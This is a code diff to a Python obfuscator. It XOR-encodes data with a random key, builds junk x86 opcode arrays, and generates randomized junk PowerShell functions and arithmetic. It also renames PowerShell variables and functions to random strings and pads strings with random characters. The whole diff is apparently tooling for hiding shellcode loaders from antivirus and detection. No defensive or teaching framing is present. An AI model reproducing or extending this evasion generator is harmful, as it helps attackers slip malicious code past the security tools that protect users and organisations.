@@ -1,4 +1,6 @@
+import re
 import random
+import string
 
 from base64 import b64encode
 
@@ -30,20 +32,76 @@ OPCODES = [
     [0x66, 0x31, 0xf6, 0x90]
 ]
 
+LIST_JUNKS = [
+f"""
+function func01 {{
+    param([string]$var03)
+
+    $var01 = "random_string"
+    $var02 = "random_string"
+
+    while ($true){{
+        if ($var01 -eq $var02){{break;}}
+        if ($var01 -gt $var02){{$var01 = $var01 - 1;}}
+        if ($var01 -lt $var02){{$var02 = $var02 - 1;}}
+    }}
+    return "random_string"
+}}
+{"\n".join([f'func01 -var03 "random_string"' for _ in range(random.randint(5,15))])}
+""",
+f"""
+$var04 = number
+{
+"\n".join(
+    [f"$var04 += number {random.choices(['-', '+', '/', '*'])[0]} number" for _ in range(random.randint(5,15))]
+)
+}
+""",
+f"""
+try{{
+    "random_string" -split "." |%{{ random_string $_}}
+}} catch {{
+    $random_string = $_.Exception
+    sleep number-(number-1)
+}}
+"""
+]
+
+def replaceString(string, idx, first_char_idx, step):
+    s = list(string)
+   
+    """
+    first_char_idx = 4 (B)
+    step = 3 (C)
+
+    [A, A, A, A, A, A, A, A, A]
+    [B, B, B, A, A, A, A, A, A, A, A, A]
+    [B, B, B, A, C, C, A, C, C, A, C, C A, C, C A]
+
+    """
+
+    if idx == 0:
+        s[idx:idx+1] = randomStr(first_char_idx, first_char_idx)[:first_char_idx-1] + s[idx]
+        #s[idx:idx+1] = ("_"*30)[:first_char_idx-1] + s[idx] # For testing
+        idx+=first_char_idx
+    else:
+        s[idx:step+idx] = randomStr(step, step)[:step-1] + "".join(s[idx:step+idx])
+        #s[idx:step+idx] = ("|"*30)[:step-1] + "".join(s[idx:step+idx]) # For testing
+        idx+=step
+
+    if idx >= len(s):
+        return "".join(s)
+
+    return replaceString("".join(s), idx, first_char_idx, step)
+
 class Obfuscator():
     def __init__(self):
         self.key = randomBytes(random.randint(128, 256))
         self.len_key = len(self.key)
-        self.key_formated = f"@({','.join([f'0x{x:02x}' for x in self.key])})"
+        self.first_char_idx = random.randint(6, 15)
+        self.step = random.randint(4, 6)
 
-    def encode():
-        pass
-
-    def get_decoder_string():
-        pass
-
-class XOREncoder(Obfuscator):
-    def encode(self, data) -> bytes:
+    def encodeXOR(self, data) -> bytes:
         enc = bytearray()
 
         for i in range(len(data)):
@@ -51,71 +109,81 @@ class XOREncoder(Obfuscator):
 
         return bytes(enc)
 
-    def get_decoder_string(self, var_byte, var_shellcode) -> str:
-        #return f"""${var_byte} = (${var_shellcode}[$i] + {hex(self.key)}) - 2 * (${var_shellcode}[$i] -band {hex(self.key)})"""
-        pass
+
+    def stringsEncoder(self, string) -> str:
+        """
+        a = list("abcdlksfdljf")
+        a[1:2] = "hola" + a[1]
+        """
+
+        return '"' + replaceString(string, 0, self.first_char_idx, self.step) + '"'
+
+    @staticmethod
+    def replaceVars(code) -> str:
+        variables = re.findall(r"(\$[a-zA-Z0-9_]{,29})[\ ]{0,}(?:[+\-\*]|)(?:=|,|\s)", code)
+        variables = list(set(variables))
+        variables = sorted(variables, key=len, reverse=True)
+
+        if "$ErrorActionPreference" in variables:
+            variables.remove("$ErrorActionPreference")
+        elif "$_" in variables:
+            variables.remove("$_")
         
-class RotateLeftEncoder(Obfuscator):
-    # soon
-    def encode(self, data) -> bytes:
-        key = random.randint(1, 7)
-        return bytes([(x << key) & 0xff for x in data])
+        for var in variables:
+            code = code.replace(var, "$"+randomStr(5, 30))
 
-    def get_decoder_string(self) -> str:
-        #return f"""$sh = ${var("shellcode")}[$i] -shl 0x{random.randint(1, 7)}"""
+        return code
 
-        pass
+    @staticmethod
+    def replaceFunctions(code) -> str:
+        new_item = (
+            "N`i", "n`I", "N`I", "NI", "n`i"
+        )
 
-def junkCode() -> str:
-    fun01 = randomStr(5, 30)
+        functions = re.findall(r"(function[\ ]{1,}[a-zA-Z0-9_]{,29})\s{0,}\{", code, flags=re.IGNORECASE)
+        
+        for func in functions:
+            parts = [x.strip() for x in func.split()]
+            char = random.choices(list(string.ascii_letters))[0]
 
-    var01 = randomStr(5, 30)
-    var02 = randomStr(5, 30)
-    var03 = randomStr(5, 30)
+            code = code.replace(func, f"{random.choices(new_item)[0]} -p (([String](Get-Command {char}:).CommandType)+':') -n {parts[1]} -value ")
+            code = code.replace(parts[1], randomStr(5, 30))
 
-    LIST_JUNKS = [
-f"""
-function {fun01} {{
-    param([string]${var03})
+        return code
 
-    ${var01} = {random.randint(128, 512)}
-    ${var02} = {random.randint(128, 512)}
+    @staticmethod
+    def junkOPCodes() -> list:
+        ops = []
 
-    while ($true){{
-        if (${var01} -eq ${var02}){{break;}}
-        if (${var01} -gt ${var02}){{${var01} = ${var01} - 1;}}
-        if (${var01} -lt ${var02}){{${var02} = ${var02} - 1;}}
-    }}
-    return "{randomStr(5, 30)}" | Out-Null
-}}
+        for op in OPCODES:
+            ops.append("@(0x{:02x},0x{:02x},0x{:02x},0x{:02x})".format(op[0], op[1], op[2], op[3]))
 
-{"\n".join([f"{fun01} -{var03} {b64encode(randomStr(200, 250).encode()).decode()}" for _ in range(random.randint(5,10))])}
-""",
-f"""
-{
-    "\n".join(
-        [f"${randomStr(5,30)} = {random.randint(100, 10000)} {random.choices(['-', '+', '/', '*'])[0]} {random.randint(100, 10000)}" for _ in range(random.randint(5,10))]
-    )
-}
-""",
-f"""
-try{{
-    {randomStr(30, 40)} -split "." |%{{ {randomStr(30, 40)} $_}}
-}} catch {{
-    ${randomStr(40, 50)} = $_.Exception
-    sleep {random.randint(2,5)}
-}}
-"""
-    ]
+        return ops
 
-    return random.choices(LIST_JUNKS)[0]
+    @staticmethod
+    def getJunkCode() -> str:
+        code = random.choices(LIST_JUNKS)[0]
 
-def junkOPCodes(len_junks=3, base_var="junk") -> tuple:
-    key = randomStr(5, 30)
-    ops = []
+        patterns = [
+            r"random_string",
+            r"number",
+            r"func\d{1,3}",
+            r"var\d{1,3}"
+        ]
 
-    for i in range(random.randint(20, 50)):
-        op = OPCODES[random.randint(0, len(OPCODES) - 1)]
-        ops.append("@(0x{:02x},0x{:02x},0x{:02x},0x{:02x})".format(op[0], op[1], op[2], op[3]))
+        for p in patterns:
+            res = re.findall(p, code)
 
-    return (key, f"@({','.join(ops)})")
+            if p == r"random_string":
+                for i in range(len(res)):
+                    code = code.replace(p, randomStr(30, 250), 1)
+            elif p == r"number":
+                for i in range(len(res)):
+                    code = code.replace(p, str(random.randint(1,10000)), 1)
+            else:
+                res = set(res)
+
+                for r in res:
+                    code = code.replace(r, randomStr(30,50))
+
+        return code
